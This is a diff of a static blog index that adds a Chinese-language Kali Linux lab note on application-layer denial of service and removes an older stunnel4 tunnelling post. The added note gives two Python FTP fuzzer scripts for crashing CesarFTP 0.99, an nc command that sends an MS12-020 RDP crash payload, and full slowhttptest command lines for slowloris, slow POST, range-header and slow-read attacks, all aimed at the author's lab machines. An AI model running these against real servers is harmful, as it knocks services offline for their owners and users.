@@ -240,6 +240,427 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82DoS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82DoS/" itemprop="url">Kali Linux笔记(八十六)：应用层DoS</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-11T12:52:37+08:00">
+                2020-02-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.9k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-应用层DoS"><a href="#1-应用层DoS" class="headerlink" title="1. 应用层DoS"></a>1. 应用层DoS</h4><ul>
+<li>应用服务漏洞<ul>
+<li>服务代码存在漏洞，遇异常提交数据时程序崩溃</li>
+<li>应用处理大量并发请求能力有限，被拒绝的是应用或OS</li>
+</ul>
+</li>
+<li>缓冲区溢出漏洞<ul>
+<li>向目标函数随机提交数据，特定情况下数据覆盖临近寄存器或内存</li>
+<li>影响：远程代码执行、DoS</li>
+<li>利用模糊测试方法发现缓冲区溢出漏洞</li>
+</ul>
+</li>
+<li>CesarFTP 0.99服务漏洞<ul>
+<li>ftp_fuzz.py  #MKD/RMD（特殊字符：/n）</li>
+</ul>
+</li>
+<li>MS12-020远程桌面协议DoS漏洞</li>
+<li>Slowhttptest（源自google）<ul>
+<li>低带宽应用层慢速DoS攻击（相对于CC等快速攻击而言的慢速）</li>
+<li>最早由Python编写，跨平台支持（Linux、win、Cygwin、OSX）</li>
+<li>尤其擅长攻击apache、tomcat（几乎百发百中）</li>
+<li>支持代理</li>
+<li>大量应用服务器和安全设备都无法防护慢速攻击</li>
+</ul>
+</li>
+<li>Slowhttptest攻击方法<ul>
+<li>Slowloris、Slow HTTP POST攻击<ul>
+<li>耗尽应用的并发连接池，类似于Http层的Syn flood（非TCP连接数）</li>
+<li>HTTP协议默认在服务器全部被接收请求之后才开始处理，若客户端发送速度缓慢或不完整，服务器时钟为其保留连接资源池占用，此类大量并发将导致DoS</li>
+<li>Slowloris：完整的http请求结尾是\r\n\r\n，攻击发\r\n…..</li>
+<li>Slow POST：HTTP头content-length声明长度，但body部分缓慢发送</li>
+</ul>
+</li>
+<li>Slow Read attack<ul>
+<li>与slowloris and slow POST目的相同，都是耗尽应用的并发连接池</li>
+<li>不同之处在于请求正常发送，但慢速读取响应数据</li>
+<li>攻击者调整TCP window窗口大小，是服务器慢速返回数据</li>
+</ul>
+</li>
+<li>Apache Range Header attack<ul>
+<li>客户端传输大文件时，体积查过HTTP Body大小限制时进行分段</li>
+<li>耗尽服务器CPU、内存资源</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">参数</th>
+<th align="center">注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">-a start</td>
+<td align="center">start value of ranges-specifier for range header test</td>
+</tr>
+<tr>
+<td align="center">-b bytes</td>
+<td align="center">limit of range-specifier for range header test</td>
+</tr>
+<tr>
+<td align="center">-c number of connections</td>
+<td align="center">limited of 65539</td>
+</tr>
+<tr>
+<td align="center">-d proxy host:port</td>
+<td align="center">for directing all traffic through web proxy</td>
+</tr>
+<tr>
+<td align="center">-e proxy host:port</td>
+<td align="center">for directing only probe traffic through web proxy</td>
+</tr>
+<tr>
+<td align="center">-H,B,R or X</td>
+<td align="center">specify to slow down in headers section or in message body,-R enables range test,-X enables slow read test</td>
+</tr>
+<tr>
+<td align="center">-g</td>
+<td align="center">generate statistics in CSV and HTML formats,pattern is slow_xxx.csv/heml,where xxx is the time and date</td>
+</tr>
+<tr>
+<td align="center">-i seconfs</td>
+<td align="center">interval between follow up datai seconds,per connection</td>
+</tr>
+<tr>
+<td align="center">-k pipeline factor</td>
+<td align="center">number of times to repeat the request in the same connection for slow read test if server supports HTTP pipe-lining</td>
+</tr>
+<tr>
+<td align="center">-l seconds</td>
+<td align="center">test duration in seconds</td>
+</tr>
+<tr>
+<td align="center">-n seconds</td>
+<td align="center">interval between read operation from receive buffer</td>
+</tr>
+<tr>
+<td align="center">-o file</td>
+<td align="center">custom output file path and/or name,effective if -g is specified</td>
+</tr>
+<tr>
+<td align="center">-p seconds</td>
+<td align="center">timeout to wait for HTTP response on probe connction,after which serber is considered inaccessible</td>
+</tr>
+<tr>
+<td align="center">-r connections per second</td>
+<td align="center">connection rate</td>
+</tr>
+<tr>
+<td align="center">-s bytes</td>
+<td align="center">value of Content-Length header,if -B specified</td>
+</tr>
+<tr>
+<td align="center">-t verb</td>
+<td align="center">custom verb to use</td>
+</tr>
+<tr>
+<td align="center">-u URL</td>
+<td align="center">target URL,the same formaat you type in browser,eg https:host[:port]</td>
+</tr>
+<tr>
+<td align="center">-v level</td>
+<td align="center">verbosity level of log 0-4</td>
+</tr>
+<tr>
+<td align="center">-w bytes</td>
+<td align="center">start of range the advertised window size would be picked from</td>
+</tr>
+<tr>
+<td align="center">-x bytes</td>
+<td align="center">max length of follow up data</td>
+</tr>
+<tr>
+<td align="center">-y bytes</td>
+<td align="center">end of range the advertised window size would be picked from</td>
+</tr>
+<tr>
+<td align="center">-z bytes</td>
+<td align="center">bytes to read from receive buffer with single read() operation</td>
+</tr>
+</tbody></table>
+<h4 id="2-实验–CesarFTP-0-99服务漏洞"><a href="#2-实验–CesarFTP-0-99服务漏洞" class="headerlink" title="2. 实验–CesarFTP 0.99服务漏洞"></a>2. 实验–CesarFTP 0.99服务漏洞</h4><ul>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>保存从主机下载的CesarFTP，并安装保存，打开运行程序Server（需要通过防火墙）</li>
+<li>双击打开CesarFTP控制端程序进行配置 → 用户/组 → 添加用户 → anonymous</li>
+<li>文件存取权限 → 选取一个文件夹作为主目录</li>
+<li>cmd → <strong><code>🔺命令：netstat -nao</code></strong>查看21端口是否开启</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：./ftp_fuzz.py</code></strong></li>
+<li>▲ <strong><code>🔺命令：netstat -nao、ftp</code></strong>登陆测试是否真的崩溃</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 6:</span><br><span class="line">    print &quot;用法：./ftp_fuzz.py [目标IP] [目标端口] [载荷] [步长] [最大长度]&quot;</span><br><span class="line">    print &quot;举例：./ftp_fuzz.py 1.1.1.1 21 A 100 1000&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip = str(sys.argv[1])</span><br><span class="line">port = int(sys.argv[2])</span><br><span class="line">char = sys.argv[3]</span><br><span class="line">i= int(sys.argv[4])</span><br><span class="line">step = int(sys.argv[4])</span><br><span class="line">max= int(sys.argv[5])</span><br><span class="line">user = raw_input(str(&quot;FTP账号：&quot;))</span><br><span class="line">passwd = raw_input(str(&quot;FTP密码：&quot;))</span><br><span class="line">command = raw_input(str(&quot;FTP命令：&quot;))</span><br><span class="line"></span><br><span class="line">while i &lt;=max:</span><br><span class="line">    try:</span><br><span class="line">        payload = command + &quot; &quot;+ (char*i)</span><br><span class="line">        print &quot;已发送&quot;+str(i)+&quot;个（ &quot;+ char + &quot;）&quot;</span><br><span class="line">        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        connect=s.connect((ip,port))</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(&quot;USER &quot;+user+&quot;\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(&quot;PASS &quot;+passwd+&quot;\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(payload+&quot;\r\n&quot;)</span><br><span class="line">        s.send(&quot;QUIT\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.close()</span><br><span class="line">        i = i + step</span><br><span class="line">    except:</span><br><span class="line">        print &quot;\n服务已崩溃&quot;</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">print &quot;\n未发现缓冲区溢出漏洞&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：./ftp_fuzz1.py</code></strong></li>
+<li>▲ <strong><code>🔺命令：netstat -nao、ftp</code></strong>登陆测试是否真的崩溃</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 5:</span><br><span class="line">    print &quot;用法：./ftp_fuzz.py [目标IP] [目标端口] [步长] [最大长度]&quot;</span><br><span class="line">    print &quot;举例：./ftp_fuzz.py 1.1.1.1 21 100 1000&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip = str(sys.argv[1])</span><br><span class="line">port = int(sys.argv[2])</span><br><span class="line">i= int(sys.argv[3])</span><br><span class="line">step = int(sys.argv[3])</span><br><span class="line">max= int(sys.argv[4])</span><br><span class="line">user = raw_input(str(&quot;FTP账号：&quot;))</span><br><span class="line">passwd = raw_input(str(&quot;FTP密码：&quot;))</span><br><span class="line">command = raw_input(str(&quot;FTP命令：&quot;))</span><br><span class="line"></span><br><span class="line">while i &lt;=max:</span><br><span class="line">    try:</span><br><span class="line">        payload = command + &quot; &quot;+ (&quot;\n&quot;*i)</span><br><span class="line">        print &quot;已发送&quot;+str(i)+&quot;个换行符&quot;</span><br><span class="line">        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        connect=s.connect((ip,port))</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(&quot;USER &quot;+user+&quot;\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(&quot;PASS &quot;+passwd+&quot;\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(payload+&quot;\r\n&quot;)</span><br><span class="line">        s.send(&quot;QUIT\r\n&quot;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.close()</span><br><span class="line">        i = i + step</span><br><span class="line">    except:</span><br><span class="line">        print &quot;\n服务已崩溃&quot;</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">print &quot;\n未发现缓冲区溢出漏洞&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-实验–MS12-020远程桌面协议DoS漏洞"><a href="#3-实验–MS12-020远程桌面协议DoS漏洞" class="headerlink" title="3. 实验–MS12-020远程桌面协议DoS漏洞"></a>3. 实验–MS12-020远程桌面协议DoS漏洞</h4><ul>
+<li>Window XP SP3<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
+<li>⭐ 2020.2.11开启远程桌面</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server
+在Terminal Server键下，你将发现一个名为fDenyTSConnection的REG_DWORD型键值。双击这个键值打开“编辑DWORD值”对话框，把1(禁用远程桌面)改成0(启用远程桌面)</code></pre></blockquote>
+<ul>
+<li>Kali<ul>
+<li><strong><code>🔺命令：searchsploit ms12-020</code></strong></li>
+<li><strong><code>🔺命令：cat /usr/share/exploitdb/platforms/windows/doc/18606.txt</code></strong></li>
+<li>下载termdd_1.dat</li>
+<li><strong><code>🔺命令：nc Window XP SP3的IP 3389 &lt; termdd_1.dat</code></strong>（多次运行才可能生效）</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-实验–Slowhttptest"><a href="#4-实验–Slowhttptest" class="headerlink" title="4. 实验–Slowhttptest"></a>4. 实验–Slowhttptest</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li>slowhttptest<ul>
+<li>-c（建立的连接数，最大值为65539）</li>
+<li>-H（slowloris攻击方式）</li>
+<li>-g/-o（输出结果）</li>
+<li>-i（间隔的时间）</li>
+<li>-r（请求速率也即每次建立的连接数）</li>
+<li>-t（请求的方法）</li>
+<li>-u（攻击的URL）</li>
+<li>-p（三秒不回则为宕机）</li>
+<li>-l（攻击时间）</li>
+<li>-B（HTTP POST 攻击模式）</li>
+</ul>
+</li>
+<li>▲ slowloris 攻击模式<ul>
+<li><strong><code>🔺命令：slowhttptest -c 1000 -H -g -o header_stats -i 10 -r 200 -t GET -u http://Metasploit的IP -x 24 -p 3</code></strong> </li>
+</ul>
+</li>
+<li>▲ Apache Range Header attack 攻击模式<ul>
+<li><strong><code>🔺命令：slowhttptest -R -u http://Metasploit的IP -t HEAD -c 1000 -a 10 -b 3000 -r 500</code></strong></li>
+</ul>
+</li>
+<li>▲ HTTP POST 攻击模式<ul>
+<li><strong><code>🔺命令：slowhttptest -c 1000 -B -g -o body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://Metasploit的IP -x 10 -p 3</code></strong></li>
+</ul>
+</li>
+<li>▲ Slow Read attack 攻击模式<ul>
+<li><strong><code>🔺命令：slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://Metasploit的IP -p 3</code></strong></li>
+</ul>
+</li>
+<li>浏览器访问Metasploit尝试连接，在根目录下生成my_header_stats.csv/my_header_stats.html文件</li>
+<li>定制连接数：<strong><code>🔺命令：ulimite -n 70000</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="5-另类的拒绝服务"><a href="#5-另类的拒绝服务" class="headerlink" title="5. 另类的拒绝服务"></a>5. 另类的拒绝服务</h4><ul>
+<li>炸邮箱<ul>
+<li>使用垃圾邮件塞满邮箱</li>
+</ul>
+</li>
+<li>无意识的/非故意的拒绝服务攻击<ul>
+<li>数据库服务器宕机恢复后引用队列大量请求洪水涌来</li>
+<li>告警邮件在邮件服务器修改地址后洪水攻击防火墙</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%94)%EF%BC%9ADoS--NTP%E6%94%BE%E5%A4%A7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2326,285 +2747,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%B0%81%E8%A3%85TCP%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93--stunnel4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%B0%81%E8%A3%85TCP%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93--stunnel4/" itemprop="url">Kali Linux笔记(七十六)：封装TCP流量隧道--stunnel4</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-03T20:05:20+08:00">
-                2020-02-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  569 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  2 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-stunnel4"><a href="#1-stunnel4" class="headerlink" title="1. stunnel4"></a>1. stunnel4</h4><ul>
-<li>无需修改原代码的情况下将TCP流量封装于SSL通道内</li>
-<li>适用于本身不支持加密传输的应用</li>
-<li>支持openssl安全特性</li>
-<li>跨平台</li>
-<li>性能优</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=3f72W09Ypd4_m6RHZRqwRoRkZnmzeAu187W9ZcPJowoFAg0MJC4grBY12IBUcHbQnNJh_4gzoy_Wu-ZPj2FaFevlgbP_Dmtge6QNiQvTMbxe_uA00GlcNSA&file_name=/stunnel4.PNG" alt="stunnel4"></p>
-<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
-<li>Mono防火墙<ul>
-<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
-</ul>
-</li>
-<li>bodhi（stunnel4 Server）<ul>
-<li>网卡方式为NAT方式，检查网络</li>
-</ul>
-</li>
-<li>metasploit（内网的应用服务器，mysql）<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-</ul>
-</li>
-<li>bodhi（stunnel4 Server）<ul>
-<li><strong><code>🔺命令：apt-get install stunnel4</code></strong></li>
-<li>网卡方式修改为Host-only方式，检查网络</li>
-<li>浏览器访问mono防火墙</li>
-<li>编辑上一个小节的NAT规则<ul>
-<li>Protocol → TCP</li>
-<li>External port range → from:3306</li>
-<li>NAT IP → Metasploit的IP地址</li>
-<li>Local port → 3306</li>
-<li>保存更改的应用</li>
-</ul>
-</li>
-<li>编辑上一小节的Rules规则（WAN口）<ul>
-<li>Destination port range → from:other 3306/to:3306</li>
-<li>保存更改的应用</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Kali（stunnel4 Client）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-<li>开启Wireshark抓包（ip.address=mono的WAN的IP）</li>
-<li><strong><code>🔺命令：mysql -u root -h mono的WAN的IP</code></strong></li>
-<li><strong><code>🔺命令：show databases;</code></strong></li>
-<li>▲ Wireshark的TCP Stream可以查看到为明文信息</li>
-</ul>
-</li>
-<li>bodhi（stunnel4 Server）<ul>
-<li>生成证书：<strong><code>🔺命令：openssl req -new –days 365 -nodes -x509 -out /etc/stunnel/ stunnel.pem -keyout /etc/stunnel/stunnel.pem</code></strong></li>
-<li>创建配置文件：/etc/stunnel/stunnel.conf<ul>
-<li>cert = /etc/stunnel/stunnel.pem </li>
-<li>setuid = stunnel4 </li>
-<li>setgid = stunnel4 </li>
-<li>pid = /var/run/stunnel4/stunnel4.pid </li>
-<li>[mysqls] </li>
-<li>accept  = 0.0.0.0:443</li>
-<li>connect = Metasploit的IP:3306</li>
-</ul>
-</li>
-<li>stunnel4自动启动<ul>
-<li>/etc/default/stunnel4 → ENABLED=1</li>
-</ul>
-</li>
-<li>启动stunnel4服务端<ul>
-<li><strong><code>🔺命令：service stunnel4 start</code></strong>（netstat -pantu进行查看是否开启）</li>
-</ul>
-</li>
-<li>浏览器登陆mono修改WAN的NAT<ul>
-<li>External port range → HTTPS/HTTPS</li>
-<li>NAT IP → bodhi的IP</li>
-<li>保存应用</li>
-</ul>
-</li>
-<li>浏览器登陆mono修改WAN的Rule规则<ul>
-<li>Destination → Address → bodhi的IP</li>
-<li>Destination port range → HTTPS/HTTPS</li>
-<li>保存应用</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Kali（stunnel4 Client）<ul>
-<li>创建配置文件：/etc/stunnel/stunnel.conf<ul>
-<li>client = yes </li>
-<li>[mysqls]    </li>
-<li>accept = 3306  </li>
-<li>connect = mono的IP:443 </li>
-</ul>
-</li>
-<li>客户端自动启动<ul>
-<li>/etc/default/stunnel4 → ENABLED=1</li>
-</ul>
-</li>
-<li>启动stunnel4客户端<ul>
-<li><strong><code>🔺命令：service stunnel4 stop / start</code></strong>（netstat -pantu进行查看是否开启）</li>
-</ul>
-</li>
-<li>开启Wireshark抓包（ip.address=mono的IP）</li>
-<li><strong><code>🔺命令：mysql -u root -h 127.0.0.1</code></strong></li>
-<li><strong><code>🔺命令：show databases;</code></strong></li>
-<li>▲ Wireshark的TCP Stream可以查看到为加密信息</li>
-</ul>
-</li>
-<li>▲ 2020.2.3外网WAN访问防火墙WAN的IP，无法进行访问，进行ping防火墙WAN的IP也无法成功，猜测与防火墙规则有关，后面有关stunnel的实验都未作，猜测VMware自带网卡的问题</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2659,7 +2801,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">132</span>
+                  <span class="site-state-item-count">133</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2766,7 +2908,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">118k</span>
+    <span title="Site words total count">118.7k</span>
   
 </div>
 
